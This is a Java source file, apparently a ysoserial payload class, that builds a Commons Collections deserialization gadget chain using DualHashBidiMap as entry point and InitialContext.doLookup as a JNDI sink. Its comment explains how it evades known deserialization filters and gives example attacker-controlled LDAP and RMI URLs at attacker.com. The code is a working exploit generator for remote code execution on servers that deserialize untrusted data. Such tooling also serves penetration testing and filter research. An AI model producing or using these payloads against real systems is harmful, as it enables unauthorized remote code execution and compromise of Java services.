package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.bidimap.DualHashBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	DualHashBidiMap entry point with JNDI sink — no TemplatesImpl needed.
	Works on JDK 17+ where TemplatesImpl module access is restricted.

	Gadget chain:
		ObjectInputStream.readObject()
			DualHashBidiMap.readObject()
				DualHashBidiMap.createMap()       // creates internal HashMap
				HashMap.put(key, value)
					key.hashCode()
						TiedMapEntry.hashCode()
							TiedMapEntry.getValue()
								LazyMap.get()
									ChainedTransformer.transform()
										ConstantTransformer → javax.naming.InitialContext.class
										InvokerTransformer → InitialContext.doLookup(jndiUrl)

	Filter evasion:
		1. DualHashBidiMap (o.a.c.c.bidimap) — not in any known filter
		2. Bypasses HashMap/HashSet/Hashtable/PQ/TreeBag entry point checks
		3. No TemplatesImpl — no module opens needed
		4. Same JNDI sink as CCJndi but with novel entry class

	Usage: payload arg is JNDI URL, e.g.:
		ldap://attacker.com/Exploit
		rmi://attacker.com/Exploit

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-collections 3.1+
		Target must allow outbound JNDI
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.DMBS335 })
public class CommonsCollectionsJndi3 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String jndiUrl) throws Exception {

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real chain: InitialContext.doLookup(jndiUrl)
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(javax.naming.InitialContext.class),
			new InvokerTransformer("getDeclaredMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"doLookup", new Class[] { String.class } }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[] { jndiUrl } }),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// DualHashBidiMap as entry gadget — novel entry point
		DualHashBidiMap bidi = new DualHashBidiMap();
		bidi.put(entry, "bar");

		// Remove cached "foo"→1 from innerMap
		innerMap.remove("foo");

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsJndi3.class, args);
	}
}
